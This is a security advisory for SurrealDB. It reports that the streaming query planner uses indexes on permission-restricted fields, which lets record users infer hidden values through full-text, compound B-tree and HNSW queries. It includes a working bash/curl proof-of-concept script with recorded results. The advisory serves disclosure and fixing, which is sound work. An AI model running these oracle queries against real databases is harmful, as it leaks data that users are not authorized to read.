repo.description:
## Summary

The streaming execution engine selects full-text, B-tree, and HNSW indexes whose columns have restrictive field-level `SELECT` permissions, then removes the index-covered predicate without re-evaluating it against the permission-reduced document (`surrealdb/core/src/exec/index/analysis.rs:19-77`, `surrealdb/core/src/exec/planner/select/mod.rs:1546-1711`).

The legacy planner rejects indexes containing fields whose `SELECT` permission is not `FULL` (`surrealdb/core/src/idx/planner/tree.rs:402-414`). The streaming planner lacks the equivalent guard even though it is the default for supported read-only statements.

A record user can determine which records contain an attacker-chosen restricted value, which records contain a restricted search term, or which records have restricted vectors nearest an attacker-chosen vector. Direct `SELECT` queries continue to hide the fields.

## Details

`IndexAnalyzer` records available indexes and matches query expressions to them without receiving or checking field permission definitions (`surrealdb/core/src/exec/index/analysis.rs:19-77`).

The legacy planner contains the missing security boundary:

```rust
// surrealdb/core/src/idx/planner/tree.rs:402-414
if let Some(idiom_index) = ix.cols.iter().position(|p| p.eq(i)) {
    // SECURITY: when permissions are being enforced, refuse to use
    // an index whose columns reference a field with a restrictive
    // SELECT permission. Otherwise the index-only `Iterate Index
    // Count` / `Iterate Index Keys` fast paths would short-circuit
    // the document-level field reduction and let a record user
    // learn the existence or cardinality of values they are not
    // allowed to read.
    if self.ctx.is_perm
        && !Self::index_columns_select_full(&ix.cols, schema.fields.as_ref())
    {
        continue;
    }
}
```

The streaming planner resolves restricted field prefixes for ordering and union decisions, but does not apply them when selecting full-text, B-tree, or HNSW sources (`surrealdb/core/src/exec/planner/select/mod.rs:1324-1346,1546-1711`).

For full-text search, `plan_fulltext_search_source` removes the `MATCHES` condition before constructing `FullTextScan`; the scan pipeline receives no residual predicate, so index results are never tested against the reduced document (`surrealdb/core/src/exec/planner/select/mod.rs:1636-1661`, `surrealdb/core/src/exec/operators/scan/fulltext.rs:208-262`).

For a compound B-tree predicate, `plan_btree_scan_source` removes the index-covered restricted-field condition. A residual condition on an unrestricted field passes against the reduced document, and the matching record remains in the result (`surrealdb/core/src/exec/planner/select/mod.rs:1546-1610`, `surrealdb/core/src/exec/operators/scan/index.rs:447-480`). A simple restricted-field equality is a negative control because that form retains the original predicate for re-evaluation.

For HNSW, `plan_knn_search_source` removes the KNN condition and `KnnScan` returns record IDs directly from the vector index. The result order and membership expose which restricted vectors are nearest the supplied vector (`surrealdb/core/src/exec/planner/select/mod.rs:1675-1711`, `surrealdb/core/src/exec/operators/scan/knn.rs`).

These paths are an incomplete enforcement of the restricted-index boundary previously applied to indexed COUNT and ORDER BY paths in `GHSA-c8jx-96c9-8xrp` and `GHSA-h4h3-3rfj-x6fq`. One fix should prevent the streaming planner from selecting any index containing a non-`FULL` field when permissions are enforced, matching the legacy guard.

CVSS: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`

CWE: `CWE-863`, `CWE-200`

## PoC

Start SurrealDB with authentication enabled:

```bash
surreal start --user root --pass root memory
```

Save and run the following HTTP-only script:

```bash
#!/usr/bin/env bash
set -euo pipefail
BASE_URL="${BASE_URL:-http://127.0.0.1:8000}"
ROOT_AUTH="${ROOT_AUTH:-root:root}"
UA="surrealdb-ghsa-reproduction"
DB_HEADERS=(-H "surreal-ns: test" -H "surreal-db: test" -H "Accept: application/json" -H "User-Agent: ${UA}")

SETUP="DEFINE TABLE user PERMISSIONS NONE; DEFINE FIELD name ON user TYPE string; DEFINE FIELD pass ON user TYPE string; DEFINE ACCESS user ON DATABASE TYPE RECORD SIGNIN (SELECT * FROM user WHERE name = \$name AND crypto::argon2::compare(pass, \$pass)) DURATION FOR SESSION 1h; CREATE user:alice SET name = 'alice', pass = crypto::argon2::generate('pass'); DEFINE TABLE articles PERMISSIONS FOR select FULL; DEFINE FIELD content ON articles TYPE string PERMISSIONS FOR select NONE; DEFINE ANALYZER simple TOKENIZERS BLANK; DEFINE INDEX idx_content ON articles FIELDS content FULLTEXT ANALYZER simple; CREATE articles:one SET content = 'The password is hunter2'; CREATE articles:two SET content = 'Nothing interesting here'; CREATE articles:three SET content = 'Also mentions hunter2 password'; DEFINE TABLE docs PERMISSIONS FOR select FULL; DEFINE FIELD secret ON docs TYPE string PERMISSIONS FOR select NONE; DEFINE FIELD category ON docs TYPE string PERMISSIONS FOR select FULL; DEFINE INDEX idx_secret ON docs FIELDS secret; CREATE docs:one SET secret = 'S3CRET_TOKEN_VALUE', category = 'a'; CREATE docs:two SET secret = 'other_value', category = 'a'; CREATE docs:three SET secret = 'S3CRET_TOKEN_VALUE', category = 'b'; DEFINE TABLE vectors PERMISSIONS FOR select FULL; DEFINE FIELD embedding ON vectors PERMISSIONS FOR select NONE; DEFINE FIELD label ON vectors PERMISSIONS FOR select FULL; DEFINE INDEX idx_embedding ON vectors FIELDS embedding HNSW DIMENSION 2 DIST EUCLIDEAN TYPE F32 EFC 50 M 8; CREATE vectors:one SET embedding = [1f, 0f], label = 'a'; CREATE vectors:two SET embedding = [9f, 9f], label = 'b'; CREATE vectors:three SET embedding = [1f, 1f], label = 'a';"

curl -fsS --user "$ROOT_AUTH" "${DB_HEADERS[@]}" -H "Content-Type: application/surrealql" --data-binary "$SETUP" "$BASE_URL/sql" >/dev/null
TOKEN=$(curl -fsS -H "Content-Type: application/json" -H "Accept: application/json" -H "User-Agent: ${UA}" --data-binary '{"ns":"test","db":"test","ac":"user","name":"alice","pass":"pass"}' "$BASE_URL/signin" | tr -d '"')
AUTH_HEADERS=(-H "Authorization: Bearer ${TOKEN}" "${DB_HEADERS[@]}" -H "Content-Type: application/surrealql")

printf '%s\n' 'Direct field control:'
curl -fsS "${AUTH_HEADERS[@]}" --data-binary 'SELECT * FROM articles:one;' "$BASE_URL/sql"
printf '\n%s\n' 'Full-text restricted-field query:'
curl -fsS "${AUTH_HEADERS[@]}" --data-binary "SELECT id FROM articles WHERE content @@ 'hunter2';" "$BASE_URL/sql"
printf '\n%s\n' 'Simple B-tree control:'
curl -fsS "${AUTH_HEADERS[@]}" --data-binary "SELECT id FROM docs WHERE secret = 'S3CRET_TOKEN_VALUE';" "$BASE_URL/sql"
printf '\n%s\n' 'Compound B-tree restricted-field query:'
curl -fsS "${AUTH_HEADERS[@]}" --data-binary "SELECT id FROM docs WHERE secret = 'S3CRET_TOKEN_VALUE' AND category = 'a';" "$BASE_URL/sql"
printf '\n%s\n' 'HNSW restricted-field query:'
curl -fsS "${AUTH_HEADERS[@]}" --data-binary 'SELECT id, label FROM vectors WHERE embedding <|2,50|> [0f, 0f];' "$BASE_URL/sql"
printf '\n'
```

Recorded results on commit `9d9a5b0` (`3.3.0-nightly`):

```text
Direct SELECT articles:one:
[{ id: articles:one }]

Full-text content @@ 'hunter2':
[{ id: articles:one }, { id: articles:three }]

Simple B-tree secret = 'S3CRET_TOKEN_VALUE':
[]

Compound B-tree secret = 'S3CRET_TOKEN_VALUE' AND category = 'a':
[{ id: docs:one }]

HNSW embedding <|2,50|> [0f, 0f]:
[{ id: vectors:one, label: 'a' }, { id: vectors:three, label: 'a' }]
```

Integration tests `fulltext_search_leaks_restricted_field_values`, `btree_compound_where_leaks_restricted_field`, and `knn_search_leaks_restricted_vector_field` exercise the same product paths. `EXPLAIN` selected `IndexScan [index: idx_secret]` for the compound B-tree query.

## Impact

A record user with table-level `SELECT` permission can use restricted-field indexes as confirmation and proximity oracles. Full-text and B-tree queries disclose which record IDs contain guessed values or terms. Repeated HNSW queries disclose nearest-neighbor relationships for restricted embeddings and can narrow their approximate values.

The restricted field values remain absent from direct query output, so the result membership itself is the unauthorized disclosure.

## Affected Versions

Confirmed on the current main-branch package version `3.3.0-nightly` at commit `9d9a5b0`.

Affected package: `rust/surrealdb-core = 3.3.0-nightly` and main-branch builds containing the streaming planner omission.

## Fixed Version

No fixed version is available.
repo.summary: Incorrect authorization: the streaming index planner exposes restricted-field matches through full-text, compound B-tree, and HNSW scans
